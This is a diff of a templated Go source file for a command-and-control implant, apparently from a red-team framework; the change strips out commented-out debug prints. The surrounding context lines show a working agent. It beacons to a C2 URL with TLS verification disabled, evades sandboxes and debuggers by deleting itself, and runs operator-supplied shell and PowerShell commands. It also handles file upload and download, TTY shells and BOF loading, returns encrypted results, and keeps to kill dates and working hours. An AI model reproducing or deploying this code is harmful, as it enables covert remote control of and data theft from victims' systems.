@@ -169,11 +169,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)
 	url := a.{AGENT_C2_URL_FIELD} + uri
 
-	// fmt.Printf("[DEBUG] Preparing API request - Method: %s, URL: %s\n", method, url)
-	// if data != nil {
-	// 	fmt.Printf("[DEBUG] Request data: %v\n", data)
-	// }
-
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		DisableKeepAlives: false,  // Keep connections alive for efficiency
@@ -188,21 +183,16 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 	if data != nil {
 		jsonData, err := json.Marshal(data)
 		if err != nil {
-			// fmt.Printf("[DEBUG] Failed to marshal JSON data: %v\n", err)
 			return nil, err
 		}
-		// fmt.Printf("[DEBUG] JSON data to send: %s\n", string(jsonData))
 		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
 		if err != nil {
-			// fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
 			return nil, err
 		}
 		req.Header.Set("Content-Type", "application/json")
 	} else {
-		// fmt.Println("[DEBUG] Creating request with no body")
 		req, err = http.NewRequest(method, url, nil)
 		if err != nil {
-			// fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
 			return nil, err
 		}
 	}
@@ -211,53 +201,40 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 		req.Header.Set(key, value)
 	}
 
-	// fmt.Println("[DEBUG] Sending HTTP request...")
 	resp, err := client.Do(req)
 	if err != nil {
-		// fmt.Printf("[DEBUG] HTTP request failed: %v\n", err)
 		return nil, err
 	}
 	defer resp.Body.Close()
 
-	// fmt.Printf("[DEBUG] HTTP response status code: %d\n", resp.StatusCode)
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Failed to read response body: %v\n", err)
 		return nil, err
 	}
 
-	// fmt.Printf("[DEBUG] HTTP response body: %s\n", string(body))
 
 	if resp.StatusCode != 200 {
-		// fmt.Printf("[DEBUG] HTTP error received: %d\n", resp.StatusCode)
 		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
 	}
 
 	var apiResp {API_RESPONSE_STRUCT_NAME}
 	err = json.Unmarshal(body, &apiResp)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Failed to unmarshal response JSON: %v\n", err)
 		return nil, err
 	}
 
-	// fmt.Printf("[DEBUG] Parsed API response: %+v\n", apiResp)
 	return &apiResp, nil
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
-	// fmt.Println("[DEBUG] Starting agent registration process")
 	if !a.{AGENT_DISABLE_SANDBOX_FIELD} {
-		// fmt.Println("[DEBUG] Performing sandbox check...")
 		if a.{AGENT_CHECK_SANDBOX_FUNC}() {
-			// fmt.Println("[DEBUG] Sandbox detected, agent self-deleting")
 			a.{AGENT_SELF_DELETE_FUNC}()
 			return fmt.Errorf("sandbox detected, agent self-deleting")
 		}
 
-		// fmt.Println("[DEBUG] Performing debugger check...")
 		if a.{AGENT_CHECK_DEBUGGERS_FUNC}() {
-			// fmt.Println("[DEBUG] Debugger detected, agent self-deleting")
 			a.{AGENT_SELF_DELETE_FUNC}()
 			return fmt.Errorf("debugger detected, agent self-deleting")
 		}
@@ -273,61 +250,45 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
 		"secret_key":       a.{AGENT_SECRET_KEY_FIELD},
 	}
 
-	// fmt.Printf("[DEBUG] Registration data: %+v\n", data)
 	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Registration request failed: %v\n", err)
 		return err
 	}
 
-	// fmt.Printf("[DEBUG] Registration response: %+v\n", resp)
 	if resp.Status == "success" {
-		// fmt.Println("[DEBUG] Registration successful")
 		if resp.Interval != 0 {
-			// fmt.Printf("[DEBUG] Updating heartbeat interval to: %d\n", resp.Interval)
 			a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = resp.Interval
 		}
 		if resp.Jitter != 0 {
-			// fmt.Printf("[DEBUG] Updating jitter to: %f\n", resp.Jitter)
 			a.{AGENT_JITTER_FIELD} = resp.Jitter
 		}
 		return nil
 	}
 
-	// fmt.Printf("[DEBUG] Registration failed with status: %s\n", resp.Status)
 	return fmt.Errorf("registration failed: %s", resp.Status)
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
-	// fmt.Printf("[DEBUG] Attempting to get tasks from URI: %s\n", a.{AGENT_TASKS_URI_FIELD})
 	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Failed to send GET request for tasks: %v\n", err)
 		return nil, err
 	}
 
-	// fmt.Printf("[DEBUG] Got response from server, status: %s\n", resp.Status)
 	if resp.Status == "success" {
 		tasks := resp.Tasks
-		// fmt.Printf("[DEBUG] Successfully retrieved %d tasks from server\n", len(tasks))
 		for i := range tasks {
-			// fmt.Printf("[DEBUG] Processing task %d, original command: %s\n", i, tasks[i].{TASK_COMMAND_FIELD})
 			if a.{AGENT_SECRET_KEY_FIELD} != nil {
 				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
 				if err == nil {
-					// fmt.Printf("[DEBUG] Successfully decrypted command: %s -> %s\n", tasks[i].{TASK_COMMAND_FIELD}, decryptedCmd)
 					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
 				} else {
-					// fmt.Printf("[DEBUG] Failed to decrypt command: %v\n", err)
 				}
 			} else {
-				// fmt.Println("[DEBUG] No encryption key, skipping decryption")
 			}
 		}
 		return tasks, nil
 	}
 
-	// fmt.Printf("[DEBUG] Server returned failure status: %s\n", resp.Status)
 	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
 }
 
@@ -397,7 +358,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, res
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
-	// fmt.Printf("[DEBUG] Executing command: %s\n", command)
 
 	commandLower := strings.ToLower(strings.TrimSpace(command))
 	isPowerShell := false
@@ -418,7 +378,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		}
 	}
 
-	// fmt.Printf("[DEBUG] PowerShell pattern count: %d\n", patternCount)
 
 	isPowerShell = patternCount >= 2 ||
 		strings.Contains(commandLower, "get-wmiobject") ||
@@ -426,17 +385,13 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		strings.Contains(commandLower, "start-process") ||
 		strings.Contains(commandLower, "powershell -")
 
-	// fmt.Printf("[DEBUG] Command is PowerShell: %t\n", isPowerShell)
 
 	if isPowerShell {
-		// fmt.Println("[DEBUG] Executing PowerShell command")
 		var cmd *exec.Cmd
 
 		if runtime.GOOS == "windows" {
-			// fmt.Println("[DEBUG] Running on Windows - using powershell with WindowStyle Hidden")
 			cmd = exec.Command("powershell", "-Command", command)
 		} else {
-			// fmt.Println("[DEBUG] Running on non-Windows - using pwsh")
 			cmd = exec.Command("pwsh", "-Command", command)
 		}
 
@@ -446,25 +401,20 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
 		err := cmd.Run()
 		if err != nil {
-			// fmt.Printf("[DEBUG] PowerShell command execution failed: %v\n", err)
 			return fmt.Sprintf("[ERROR] PowerShell command execution failed: %v", err)
 		}
 
 		output := stdout.String() + stderr.String()
-		// fmt.Printf("[DEBUG] PowerShell command output: %s\n", output)
 		if output == "" {
 			return "[PowerShell command executed successfully - no output]"
 		}
 		return output
 	} else {
-		// fmt.Println("[DEBUG] Executing regular command")
 		var cmd *exec.Cmd
 
 		if runtime.GOOS == "windows" {
-			// fmt.Println("[DEBUG] Running on Windows - using cmd /C")
 			cmd = exec.Command("cmd", "/C", command)
 		} else {
-			// fmt.Println("[DEBUG] Running on non-Windows - using sh -c")
 			cmd = exec.Command("sh", "-c", command)
 		}
 
@@ -474,12 +424,10 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
 		err := cmd.Run()
 		if err != nil {
-			// fmt.Printf("[DEBUG] Regular command execution failed: %v\n", err)
 			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
 		}
 
 		output := stdout.String() + stderr.String()
-		// fmt.Printf("[DEBUG] Regular command output: %s\n", output)
 		if output == "" {
 			return "[Command executed successfully - no output]"
 		}
@@ -488,27 +436,15 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
-	// fmt.Printf("[DEBUG] Preparing to submit task result for task ID: %s\n", taskID)
-	// fmt.Printf("[DEBUG] Result content (first 100 chars): %s...\n", func() string {
-	// 	if len(result) > 100 {
-	// 		return result[:100]
-	// 	}
-	// 	return result
-	// }())
-
 	var encryptedResult string
 	var err error
 	if a.{AGENT_SECRET_KEY_FIELD} != nil {
-		// fmt.Printf("[DEBUG] Attempting to encrypt result for task %s\n", taskID)
 		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
 		if err != nil {
-			// fmt.Printf("[DEBUG] Failed to encrypt result, using original: %v\n", err)
 			encryptedResult = result
 		} else {
-			// fmt.Printf("[DEBUG] Successfully encrypted result for task %s\n", taskID)
 		}
 	} else {
-		// fmt.Printf("[DEBUG] No encryption key, using result as-is for task %s\n", taskID)
 		encryptedResult = result
 	}
 
@@ -517,15 +453,11 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result str
 		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
 	}
 
-	// fmt.Printf("[DEBUG] Sending POST request to URI: %s\n", a.{AGENT_RESULTS_URI_FIELD})
 	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Failed to submit task result for task %s: %v\n", taskID, err)
 		return err
 	} else {
-		// fmt.Printf("[DEBUG] Successfully submitted task result for task %s\n", taskID)
 		if resp != nil {
-			// fmt.Printf("[DEBUG] Server response status: %s\n", resp.Status)
 		}
 	}
 	return nil
@@ -688,81 +620,58 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
-	// fmt.Printf("[DEBUG] Processing command: %s\n", command)
 
 	if strings.HasPrefix(command, "module ") {
 		encodedScript := command[7:] // Remove "module " prefix
-		// fmt.Printf("[DEBUG] Processing module command with script: %s\n", encodedScript)
 		result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
-		// fmt.Printf("[DEBUG] Module command result: %s\n", result)
 		return result
 	} else if strings.HasPrefix(command, "upload ") {
-		// fmt.Println("[DEBUG] Processing upload command")
 		result := a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
-		// fmt.Printf("[DEBUG] Upload command result: %s\n", result)
 		return result
 	} else if strings.HasPrefix(command, "download ") {
-		// fmt.Println("[DEBUG] Processing download command")
 		result := a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
-		// fmt.Printf("[DEBUG] Download command result: %s\n", result)
 		return result
 	} else if strings.HasPrefix(command, "tty_shell") {
-		// fmt.Println("[DEBUG] Processing TTY shell command")
 		result := a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
-		// fmt.Printf("[DEBUG] TTY shell command result: %s\n", result)
 		return result
 	} else if strings.HasPrefix(command, "sleep ") {
-		// fmt.Println("[DEBUG] Processing sleep command")
 		result := a.{AGENT_HANDLE_SLEEP_FUNC}(command)
-		// fmt.Printf("[DEBUG] Sleep command result: %s\n", result)
 		return result
 	} else if strings.HasPrefix(command, "bof ") {
-		// fmt.Println("[DEBUG] Processing BOF command")
 		result := a.{AGENT_HANDLE_BOF_FUNC}(command)
-		// fmt.Printf("[DEBUG] BOF command result: %s\n", result)
 		return result
 	} else if command == "kill" {
-		// fmt.Println("[DEBUG] Processing kill command")
 		a.{AGENT_RUNNING_FIELD} = false
 		os.Exit(0)
 		return "[SUCCESS] Agent killed"
 	} else {
-		// fmt.Println("[DEBUG] Processing regular command via execute function")
 		result := a.{AGENT_EXECUTE_FUNC}(command)
-		// fmt.Printf("[DEBUG] Regular command result: %s\n", result)
 		return result
 	}
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
-	// fmt.Println("[DEBUG] Agent run function started")
 
 	for {
 		// Check kill date first
 		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
-			// fmt.Println("[DEBUG] Kill date reached, agent self-deleting")
 			a.{AGENT_SELF_DELETE_FUNC}()
 			return
 		}
 
-		// fmt.Println("[DEBUG] Attempting agent registration...")
 		err := a.{AGENT_REGISTER_FUNC}()
 		if err == nil {
-			// fmt.Println("[DEBUG] Registration successful")
 			break
 		}
-		// fmt.Printf("[DEBUG] Registration failed, will retry in 30 seconds: %v\n", err)
 		time.Sleep(30 * time.Second)
 	}
 
 	a.{AGENT_RUNNING_FIELD} = true
 	checkCount := 0
 
-	// fmt.Println("[DEBUG] Entering main agent loop...")
 	for a.{AGENT_RUNNING_FIELD} {
 		// Check kill date on each iteration
 		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
-			// fmt.Println("[DEBUG] Kill date reached during operation, agent self-deleting")
 			a.{AGENT_SELF_DELETE_FUNC}()
 			return
 		}
@@ -770,72 +679,51 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 		// Check if we're outside working hours
 		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
 			// Sleep for 5 minutes and check again
-			// fmt.Println("[DEBUG] Outside working hours, sleeping until next check...")
 			time.Sleep(5 * time.Minute)
 			continue
 		}
 
 		checkCount++
-		// fmt.Printf("[DEBUG] Loop iteration count: %d\n", checkCount)
 
 		if checkCount%3 == 0 {
-			// fmt.Println("[DEBUG] Checking interactive status...")
 			shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
 			if err == nil {
-				// fmt.Printf("[DEBUG] Interactive status check result: should_be_interactive=%t, current_mode=%t\n", shouldBeInteractive, a.{AGENT_INTERACTIVE_MODE_FIELD})
 				if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
 					a.{AGENT_INTERACTIVE_MODE_FIELD} = true
-					// fmt.Println("[DEBUG] Switched to interactive mode")
 				} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
 					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
-					// fmt.Println("[DEBUG] Switched to normal mode")
 				}
 			} else {
-				// fmt.Printf("[DEBUG] Failed to check interactive status: %v\n", err)
 			}
 		}
 
 		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
-			// fmt.Println("[DEBUG] Normal mode - checking for tasks...")
 			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
 			if err != nil {
-				// fmt.Printf("[DEBUG] Failed to get tasks: %v\n", err)
 				time.Sleep(30 * time.Second)
 				continue
 			}
 
-			// fmt.Printf("[DEBUG] Received %d tasks to process\n", len(tasks))
 
 			for _, task := range tasks {
-				// fmt.Printf("[DEBUG] Processing task ID: %d, Command: %s\n", task.{TASK_ID_FIELD}, task.{TASK_COMMAND_FIELD})
 				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
-				// fmt.Printf("[DEBUG] Task execution result: %s\n", result)
 				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
-					// fmt.Printf("[DEBUG] Failed to submit task result for task %s: %v\n", taskIDStr, err)
 				} else {
-					// fmt.Printf("[DEBUG] Successfully submitted result for task %s\n", taskIDStr)
 				}
 			}
 		} else {
-			// fmt.Println("[DEBUG] Interactive mode - checking for interactive commands...")
 			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
 			if err != nil {
-				// fmt.Printf("[DEBUG] Failed to get interactive command: %v\n", err)
 			} else if interactiveTask != nil {
-				// fmt.Printf("[DEBUG] Received interactive task ID: %d, Command: %s\n", interactiveTask.{TASK_ID_FIELD}, interactiveTask.{TASK_COMMAND_FIELD})
 				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
-				// fmt.Printf("[DEBUG] Interactive task result: %s\n", result)
 				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
-					// fmt.Printf("[DEBUG] Failed to submit interactive result for task %s: %v\n", taskIDStr, err)
 				} else {
-					// fmt.Printf("[DEBUG] Successfully submitted interactive result for task %s\n", taskIDStr)
 				}
 			} else {
-				// fmt.Println("[DEBUG] No interactive command received")
 			}
 		}
 
@@ -845,7 +733,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 		if sleepTime < 5 {
 			sleepTime = 5
 		}
-		// fmt.Printf("[DEBUG] Sleeping for %f seconds before next iteration\n", sleepTime)
 
 		time.Sleep(time.Duration(sleepTime) * time.Second)
 	}
@@ -1304,10 +1191,8 @@ func main() {
 
 	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, disableSandbox)
 	if err != nil {
-		// fmt.Printf("[DEBUG] Failed to create agent: %v\n", err)
 		os.Exit(1)
 	}
 
-	// fmt.Println("[DEBUG] Starting agent main loop...")
 	agent.{AGENT_RUN_FUNC}()
 }
